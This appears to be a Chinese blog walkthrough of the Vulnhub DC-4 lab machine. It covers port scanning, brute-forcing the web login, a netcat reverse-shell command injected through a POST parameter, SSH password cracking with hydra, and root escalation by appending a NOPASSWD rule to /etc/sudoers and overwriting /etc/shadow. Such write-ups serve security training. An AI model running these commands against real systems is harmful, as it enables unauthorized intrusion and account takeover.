{"pageProps":{"postData":{"id":"VulnhubDC-4","contentHtml":"<h1>DC-4</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/dc-4,313/\">https://www.vulnhub.com/entry/dc-4,313/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>173</code>是靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>                      \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-01 15:33 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00017</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.173</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00054</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">61</span>:<span class=\"hljs-number\">57</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00022</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:E0:C9:<span class=\"hljs-number\">6</span>A (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\n</code></pre>\n</li>\n<li>\n<p>扫描靶机所有开放端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.173</span>\nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-01 15:34 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.173</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0011</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">61</span>:<span class=\"hljs-number\">57</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sV -sT -O -p80,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.173</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-11-01 15:36 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.173</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.0010</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">7.4</span>p1 Debian <span class=\"hljs-number\">10</span>+<span class=\"hljs-title function_ invoke__\">deb9u6</span> (protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    nginx <span class=\"hljs-number\">1.15</span>.<span class=\"hljs-number\">10</span>\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:<span class=\"hljs-number\">01</span>:<span class=\"hljs-number\">61</span>:<span class=\"hljs-number\">57</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">3</span>.X|<span class=\"hljs-number\">4</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span>\nOS details: Linux <span class=\"hljs-number\">3.2</span> - <span class=\"hljs-number\">4.9</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-python\">nmap -script=vuln -p <span class=\"hljs-number\">80</span>,<span class=\"hljs-number\">22</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span> \nStarting Nmap <span class=\"hljs-number\">7.94</span>SVN ( https://nmap.org ) at <span class=\"hljs-number\">2024</span>-<span class=\"hljs-number\">11</span>-01 <span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">37</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00030</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n| http-csrf: \n| Spidering limited to: maxdepth=<span class=\"hljs-number\">3</span>; maxpagecount=<span class=\"hljs-number\">20</span>; withinhost=<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>\n|   Found the following possible CSRF vulnerabilities: \n|     \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>:<span class=\"hljs-number\">80</span>/\n|     Form <span class=\"hljs-built_in\">id</span>: \n|     Form action: login.php\n|     \n|     Path: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>:<span class=\"hljs-number\">80</span>/login.php\n|     Form <span class=\"hljs-built_in\">id</span>: \n|_    Form action: login.php\n|_http-dombased-xss: Couldn<span class=\"hljs-string\">'t find any DOM based XSS.\n|_http-stored-xss: Couldn'</span>t find <span class=\"hljs-built_in\">any</span> stored XSS vulnerabilities.\nMAC Address: <span class=\"hljs-number\">00</span>:0C:<span class=\"hljs-number\">29</span>:01:<span class=\"hljs-number\">61</span>:<span class=\"hljs-number\">57</span> (VMware)\n</code></pre>\n</li>\n</ol>\n<h2>web渗透</h2>\n<ol>\n<li>\n<p>访问页面，显示**<code>Admin Information Systems Login</code>**</p>\n<p><img src=\"/post-images/VulnhubDC-4/image27.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>扫描目录，也没发现</p>\n<pre><code class=\"hljs language-python\">dirsearch -u <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span> -x <span class=\"hljs-number\">403</span>\n//\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">32</span>] Starting:\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">53</span>] <span class=\"hljs-number\">302</span> -  704B  - /command.php  ->  index.php\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">40</span>:<span class=\"hljs-number\">55</span>] <span class=\"hljs-number\">301</span> -  170B  - /css  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>/css/\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">41</span>:02] <span class=\"hljs-number\">301</span> -  170B  - /images  ->  http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>/images/\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">41</span>:06] <span class=\"hljs-number\">302</span> -  206B  - /login.php  ->  index.php\n[<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">41</span>:07] <span class=\"hljs-number\">302</span> -  163B  - /logout.php  ->  index.php\n\n</code></pre>\n</li>\n<li>\n<p>尝试了<code>sql</code>注入也没效果，尝试暴力破解</p>\n</li>\n<li>\n<p>用户名是<code>admin</code>，爆破密码</p>\n<p><img src=\"/post-images/VulnhubDC-4/image28.png\" alt=\"image.png\"></p>\n<p><code>happy</code>的时候长度明显不一样，密码应该就是<code>happy</code>了</p>\n</li>\n<li>\n<p>成功登陆进去，点击<code>run</code>会执行查看当前目录文件，执行的命令是<code>ls -l</code></p>\n<p><img src=\"/post-images/VulnhubDC-4/image29.png\" alt=\"image.png\"></p>\n</li>\n<li>\n<p>当我们不知道命令是怎么控制的，抓包看看</p>\n<pre><code class=\"hljs language-python\">POST /command.php HTTP/<span class=\"hljs-number\">1.1</span>\nHost: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>\nUser-Agent: Mozilla/<span class=\"hljs-number\">5.0</span> (Windows NT <span class=\"hljs-number\">10.0</span>; Win64; x64; rv:<span class=\"hljs-number\">132.0</span>) Gecko/<span class=\"hljs-number\">20100101</span> Firefox/<span class=\"hljs-number\">132.0</span>\nAccept: text/html,application/xhtml+xml,application/xml;q=<span class=\"hljs-number\">0.9</span>,*/*;q=<span class=\"hljs-number\">0.8</span>\nAccept-Language: zh-CN,zh;q=<span class=\"hljs-number\">0.8</span>,zh-TW;q=<span class=\"hljs-number\">0.7</span>,zh-HK;q=<span class=\"hljs-number\">0.5</span>,en-US;q=<span class=\"hljs-number\">0.3</span>,en;q=<span class=\"hljs-number\">0.2</span>\nAccept-Encoding: gzip, deflate, br\nContent-<span class=\"hljs-type\">Type</span>: application/x-www-form-urlencoded\nContent-Length: <span class=\"hljs-number\">22</span>\nOrigin: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>\nSec-GPC: <span class=\"hljs-number\">1</span>\nConnection: keep-alive\nReferer: http://<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>/command.php\nCookie: PHPSESSID=18ugmlkd6apve37kqclfdj4100\nUpgrade-Insecure-Requests: <span class=\"hljs-number\">1</span>\nPriority: u=<span class=\"hljs-number\">0</span>, i\n\nradio=ls+-l&#x26;submit=Run\n</code></pre>\n<p>原来是在数据包参数<code>radio</code>规定执行的命令，我们直接输入反弹<code>shell</code>命令，kali同时开启监听</p>\n<pre><code class=\"hljs language-python\">radio=nc <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span> <span class=\"hljs-number\">1234</span> -e /<span class=\"hljs-built_in\">bin</span>/bash&#x26;submit=Run\n</code></pre>\n<p>获得shell</p>\n<pre><code class=\"hljs language-python\">listening on [<span class=\"hljs-built_in\">any</span>] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.151</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>] <span class=\"hljs-number\">45602</span>\n</code></pre>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-python\">www-data@dc-<span class=\"hljs-number\">4</span>:/usr/share/nginx/html$ whoami\nwww-data\n//\nwww-data@dc-<span class=\"hljs-number\">4</span>:/usr/share/nginx/html$ <span class=\"hljs-built_in\">id</span>\nuid=<span class=\"hljs-number\">33</span>(www-data) gid=<span class=\"hljs-number\">33</span>(www-data) groups=<span class=\"hljs-number\">33</span>(www-data)\n//\nwww-data@dc-<span class=\"hljs-number\">4</span>:/usr/share/nginx/html$ uname -a\nLinux dc-<span class=\"hljs-number\">4</span> <span class=\"hljs-number\">4.9</span><span class=\"hljs-number\">.0</span>-<span class=\"hljs-number\">3</span>-<span class=\"hljs-number\">686</span> <span class=\"hljs-comment\">#1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686 GNU/Linux</span>\n</code></pre>\n</li>\n<li>\n<p>查找敏感文件</p>\n<pre><code class=\"hljs language-python\">www-data@dc-<span class=\"hljs-number\">4</span>:/usr/share/nginx/html$ find / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\nfind / -perm -u=s -<span class=\"hljs-built_in\">type</span> f <span class=\"hljs-number\">2</span>>/dev/null\n/usr/<span class=\"hljs-built_in\">bin</span>/gpasswd\n/usr/<span class=\"hljs-built_in\">bin</span>/chfn\n/usr/<span class=\"hljs-built_in\">bin</span>/sudo\n/usr/<span class=\"hljs-built_in\">bin</span>/chsh\n/usr/<span class=\"hljs-built_in\">bin</span>/newgrp\n/usr/<span class=\"hljs-built_in\">bin</span>/passwd\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/lib/dbus-<span class=\"hljs-number\">1.0</span>/dbus-daemon-launch-helper\n/usr/sbin/exim4\n/<span class=\"hljs-built_in\">bin</span>/mount\n/<span class=\"hljs-built_in\">bin</span>/umount\n/<span class=\"hljs-built_in\">bin</span>/su\n/<span class=\"hljs-built_in\">bin</span>/ping\n/home/jim/test.sh\n</code></pre>\n<p>发现一个存在可执行文件<code>test.sh</code></p>\n</li>\n<li>\n<p>查看<code>test.sh</code>内容，应该提示该目录下有东西什么的</p>\n<pre><code class=\"hljs language-python\">www-data@dc-<span class=\"hljs-number\">4</span>:/home/jim$ cat test.sh\n//\n<span class=\"hljs-comment\">#!/bin/bash</span>\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> {<span class=\"hljs-number\">1.</span><span class=\"hljs-number\">.5</span>}\ndo\n sleep <span class=\"hljs-number\">1</span>\n echo <span class=\"hljs-string\">\"Learn bash they said.\"</span>\n sleep <span class=\"hljs-number\">1</span>\n echo <span class=\"hljs-string\">\"Bash is good they said.\"</span>\ndone\n echo <span class=\"hljs-string\">\"But I'd rather bash my head against a brick wall.\"</span>\n</code></pre>\n</li>\n<li>\n<p>进行查看<code>jim</code>目录下的文件，目录下的<code>mbox</code>文件没访问权限，在<code>backups</code>目录下找到<code>old-passwords.bak</code></p>\n<pre><code class=\"hljs language-python\">www-data@dc-<span class=\"hljs-number\">4</span>:/home/jim/backups$ cat old-passwords.bak\ncat old-passwords.bak\n<span class=\"hljs-number\">000000</span>\n<span class=\"hljs-number\">12345</span>\niloveyou\n1q2w3e4r5t\n<span class=\"hljs-number\">1234</span>\n123456a\n\n...........\n\nsvetlana\nfatima\n123456k\nicecream\npopcorn1\n</code></pre>\n<p>是很多的的密码，我们拿去爆破<code>ssh</code>用户<code>jim</code> ，将内容保存为<code>passwd</code></p>\n</li>\n<li>\n<p>使用hydra爆破</p>\n<pre><code class=\"hljs language-python\"> hydra -l jim -P passwd -vV -e ns <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span> ssh\n</code></pre>\n<pre><code class=\"hljs language-python\">[<span class=\"hljs-number\">22</span>][ssh] host: <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span>   login: jim   password: jibril04\n[STATUS] attack finished <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.173</span> (waiting <span class=\"hljs-keyword\">for</span> children to complete tests)\n<span class=\"hljs-number\">1</span> of <span class=\"hljs-number\">1</span> target successfully completed, <span class=\"hljs-number\">1</span> valid password found\n</code></pre>\n<p>破解出用户<code>jim</code>密码<code>jibril04</code> ，其实也可以用来尝试破解<code>root</code>用户，不过没破解出来</p>\n</li>\n<li>\n<p>登录<code>jim</code>用户,查看权限</p>\n<ul>\n<li>\n<p>没有相关<code>sudo</code>权限</p>\n</li>\n<li>\n<p>查看当前目录下的<code>mbox</code>文件</p>\n<pre><code class=\"hljs language-python\">From root@dc-<span class=\"hljs-number\">4</span> Sat Apr 06 <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">20</span>:04 <span class=\"hljs-number\">2019</span>\nReturn-path: &#x3C;root@dc-<span class=\"hljs-number\">4</span>>\nEnvelope-to: jim@dc-<span class=\"hljs-number\">4</span>\nDelivery-date: Sat, 06 Apr <span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">20</span>:04 +<span class=\"hljs-number\">1000</span>\nReceived: <span class=\"hljs-keyword\">from</span> root by dc-<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">with</span> local (Exim <span class=\"hljs-number\">4.89</span>)\n        (envelope-<span class=\"hljs-keyword\">from</span> &#x3C;root@dc-<span class=\"hljs-number\">4</span>>)\n        <span class=\"hljs-built_in\">id</span> 1hCiQe-0000gc-EC\n        <span class=\"hljs-keyword\">for</span> jim@dc-<span class=\"hljs-number\">4</span>; Sat, 06 Apr <span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">20</span>:04 +<span class=\"hljs-number\">1000</span>\nTo: jim@dc-<span class=\"hljs-number\">4</span>\nSubject: Test\nMIME-Version: <span class=\"hljs-number\">1.0</span>\nContent-<span class=\"hljs-type\">Type</span>: text/plain; charset=<span class=\"hljs-string\">\"UTF-8\"</span>\nContent-Transfer-Encoding: 8bit\nMessage-Id: &#x3C;E1hCiQe-0000gc-EC@dc-<span class=\"hljs-number\">4</span>>\nFrom: root &#x3C;root@dc-<span class=\"hljs-number\">4</span>>\nDate: Sat, 06 Apr <span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">20</span>:04 +<span class=\"hljs-number\">1000</span>\nStatus: RO\n\nThis <span class=\"hljs-keyword\">is</span> a test.\n</code></pre>\n<p>是一封来自<code>root</code>的文件，跟着邮件这个线索，我们去翻邮件<code>/var/mail</code> 存在一封<code>jim</code>的邮件</p>\n<pre><code class=\"hljs language-python\">From charles@dc-<span class=\"hljs-number\">4</span> Sat Apr 06 <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">46</span> <span class=\"hljs-number\">2019</span>\nReturn-path: &#x3C;charles@dc-<span class=\"hljs-number\">4</span>>\nEnvelope-to: jim@dc-<span class=\"hljs-number\">4</span>\nDelivery-date: Sat, 06 Apr <span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">46</span> +<span class=\"hljs-number\">1000</span>\nReceived: <span class=\"hljs-keyword\">from</span> charles by dc-<span class=\"hljs-number\">4</span> <span class=\"hljs-keyword\">with</span> local (Exim <span class=\"hljs-number\">4.89</span>)\n        (envelope-<span class=\"hljs-keyword\">from</span> &#x3C;charles@dc-<span class=\"hljs-number\">4</span>>)\n        <span class=\"hljs-built_in\">id</span> 1hCjIX-0000kO-Qt\n        <span class=\"hljs-keyword\">for</span> jim@dc-<span class=\"hljs-number\">4</span>; Sat, 06 Apr <span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">45</span> +<span class=\"hljs-number\">1000</span>\nTo: jim@dc-<span class=\"hljs-number\">4</span>\nSubject: Holidays\nMIME-Version: <span class=\"hljs-number\">1.0</span>\nContent-<span class=\"hljs-type\">Type</span>: text/plain; charset=<span class=\"hljs-string\">\"UTF-8\"</span>\nContent-Transfer-Encoding: 8bit\nMessage-Id: &#x3C;E1hCjIX-0000kO-Qt@dc-<span class=\"hljs-number\">4</span>>\nFrom: Charles &#x3C;charles@dc-<span class=\"hljs-number\">4</span>>\nDate: Sat, 06 Apr <span class=\"hljs-number\">2019</span> <span class=\"hljs-number\">21</span>:<span class=\"hljs-number\">15</span>:<span class=\"hljs-number\">45</span> +<span class=\"hljs-number\">1000</span>\nStatus: O\n\nHi Jim,\n\nI<span class=\"hljs-string\">'m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.\n\nPassword is:  ^xHhA&#x26;hvim0y\n\nSee ya,\nCharles\n</span></code></pre>\n<p>告诉我们<code>Charles</code>的密码是<code>^xHhA&#x26;hvim0y</code></p>\n</li>\n</ul>\n</li>\n<li>\n<p>登录<code>charles</code>用户，查看权限</p>\n<pre><code class=\"hljs language-python\">charles@dc-<span class=\"hljs-number\">4</span>:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> charles on dc-<span class=\"hljs-number\">4</span>:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\n\nUser charles may run the following commands on dc-<span class=\"hljs-number\">4</span>:\n    (root) NOPASSWD: /usr/<span class=\"hljs-built_in\">bin</span>/teehee\n</code></pre>\n<p>存在有sudo权限的<code>teehee</code> 命令</p>\n<pre><code class=\"hljs language-python\">charles@dc-<span class=\"hljs-number\">4</span>:/usr/<span class=\"hljs-built_in\">bin</span>$ sudo teehee --<span class=\"hljs-built_in\">help</span>\nUsage: teehee [OPTION]... [FILE]...\nCopy standard <span class=\"hljs-built_in\">input</span> to each FILE, <span class=\"hljs-keyword\">and</span> also to standard output.\n\n  -a, --append              append to the given FILEs, do <span class=\"hljs-keyword\">not</span> overwrite\n  -i, --ignore-interrupts   ignore interrupt signals\n  -p                        diagnose errors writing to non pipes\n      --output-error[=MODE]   <span class=\"hljs-built_in\">set</span> behavior on write error.  See MODE below\n      --<span class=\"hljs-built_in\">help</span>     display this <span class=\"hljs-built_in\">help</span> <span class=\"hljs-keyword\">and</span> exit\n      --version  output version information <span class=\"hljs-keyword\">and</span> exit\n\nMODE determines behavior <span class=\"hljs-keyword\">with</span> write errors on the outputs:\n  <span class=\"hljs-string\">'warn'</span>         diagnose errors writing to <span class=\"hljs-built_in\">any</span> output\n  <span class=\"hljs-string\">'warn-nopipe'</span>  diagnose errors writing to <span class=\"hljs-built_in\">any</span> output <span class=\"hljs-keyword\">not</span> a pipe\n  <span class=\"hljs-string\">'exit'</span>         exit on error writing to <span class=\"hljs-built_in\">any</span> output\n  <span class=\"hljs-string\">'exit-nopipe'</span>  exit on error writing to <span class=\"hljs-built_in\">any</span> output <span class=\"hljs-keyword\">not</span> a pipe\nThe default MODE <span class=\"hljs-keyword\">for</span> the -p option <span class=\"hljs-keyword\">is</span> <span class=\"hljs-string\">'warn-nopipe'</span>.\nThe default operation when --output-error <span class=\"hljs-keyword\">is</span> <span class=\"hljs-keyword\">not</span> specified, <span class=\"hljs-keyword\">is</span> to\nexit immediately on error writing to a pipe, <span class=\"hljs-keyword\">and</span> diagnose errors\nwriting to non pipe outputs.\n\nGNU coreutils online <span class=\"hljs-built_in\">help</span>: &#x3C;http://www.gnu.org/software/coreutils/>\nFull documentation at: &#x3C;http://www.gnu.org/software/coreutils/tee>\n<span class=\"hljs-keyword\">or</span> available locally via: info <span class=\"hljs-string\">'(coreutils) tee invocation'</span>\n</code></pre>\n</li>\n<li>\n<p><code>teehee</code>提权，直接给用户<code>sudo all nopasswd</code>权限</p>\n<pre><code class=\"hljs language-python\">echo <span class=\"hljs-string\">\"charles ALL=(ALL) NOPASSWD: ALL\"</span> | sudo teehee -a /etc/sudoers\n</code></pre>\n<p>然后修改<code>shadow</code>文件</p>\n<pre><code class=\"hljs language-python\">sudo nano /etc/shadow\n</code></pre>\n<p>将当前用户<code>charles</code>的密码覆盖<code>root</code>账户的密码</p>\n<pre><code class=\"hljs language-python\">\nroot:$<span class=\"hljs-number\">6</span>$C7nromw2$HB4uMhUmb.srv.I.Q00bT/SV3fxgphbarSb4A8B0aI6kPGOy6WKrKJk.ckCfMLuO6H4uqGx68ylJcmB5ezJ.r0:<span class=\"hljs-number\">17992</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n.......\ncharles:$<span class=\"hljs-number\">6</span>$C7nromw2$HB4uMhUmb.srv.I.Q00bT/SV3fxgphbarSb4A8B0aI6kPGOy6WKrKJk.ckCfMLuO6H4uqGx68ylJcmB5ezJ.r0:<span class=\"hljs-number\">17992</span>:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">99999</span>:<span class=\"hljs-number\">7</span>:::\n</code></pre>\n<p><code>su</code>切换到<code>root</code> ，使用<code>charles</code>的密码<code>^xHhA&#x26;hvim0y</code></p>\n<pre><code class=\"hljs language-python\">charles@dc-<span class=\"hljs-number\">4</span>:~$ su root\nPassword: \nroot@dc-<span class=\"hljs-number\">4</span>:/home/charles<span class=\"hljs-comment\"># </span>\n</code></pre>\n<p>提权成功！读取<code>flag</code>文件</p>\n<pre><code class=\"hljs language-python\"><span class=\"hljs-comment\"># root@dc-4:~# cat flag.txt</span>\n\n<span class=\"hljs-number\">888</span>       <span class=\"hljs-number\">888</span>          <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      8888888b.                             <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> \n<span class=\"hljs-number\">888</span>   o   <span class=\"hljs-number\">888</span>          <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>  <span class=\"hljs-string\">\"Y88b                            888 888 888 888 \n888  d8b  888          888 888      888    888                            888 888 888 888 \n888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 \n888d88888b888 d8P  Y8b 888 888      888    888 d88\"</span><span class=\"hljs-string\">\"88b 888 \"</span>88b d8P  Y8b <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span> \n88888P Y88888 <span class=\"hljs-number\">88888888</span> <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>    <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">88888888</span> Y8P Y8P Y8P Y8P \n8888P   Y8888 Y8b.     <span class=\"hljs-number\">888</span> <span class=\"hljs-number\">888</span>      <span class=\"hljs-number\">888</span>  .d88P Y88.<span class=\"hljs-number\">.88</span>P <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span> Y8b.      <span class=\"hljs-string\">\"   \"</span>   <span class=\"hljs-string\">\"   \"</span>  \n888P     Y888  <span class=\"hljs-string\">\"Y8888  888 888      8888888P\"</span>   <span class=\"hljs-string\">\"Y88P\"</span>  <span class=\"hljs-number\">888</span>  <span class=\"hljs-number\">888</span>  <span class=\"hljs-string\">\"Y8888  888 888 888 888 \n\nCongratulations!!!\n\nHope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those\nwho have provided feedback, and who have taken time to complete these little\nchallenges.\n\nIf you enjoyed this CTF, send me a tweet via @DCAU7.\n</span></code></pre>\n</li>\n</ol>","title":"Vulnhub - DC-4","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"DC-4\n\n https://www.vulnhub.com/entry/dc-4,313/\n \n\n主机发现端口扫描\n\n1. 探测存活主机，`173`是靶机\n    \n    \n    \n2. 扫描靶机所有开放端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. 扫描漏洞\n    \n    \n    \n\nweb渗透\n\n1. 访问页面，显示`Admin..."},"recentPosts":[{"id":"Sunshine + moonlight 息屏串流方案","title":"Sunshine + moonlight 息屏串流方案","date":"2025-10-18","isEncrypted":false,"year":"2025","month":"10","day":"18"},{"id":"HackMyVMBirdeye","title":"HackMyVM - Birdeye","date":"2025-10-17","isEncrypted":false,"year":"2025","month":"10","day":"17"},{"id":"HackTheBoxSeason8 - Signed","title":"HackTheBox - Season9 - Signed","date":"2025-10-14","isEncrypted":true,"year":"2025","month":"10","day":"14"},{"id":"HackTheBoxSeason8 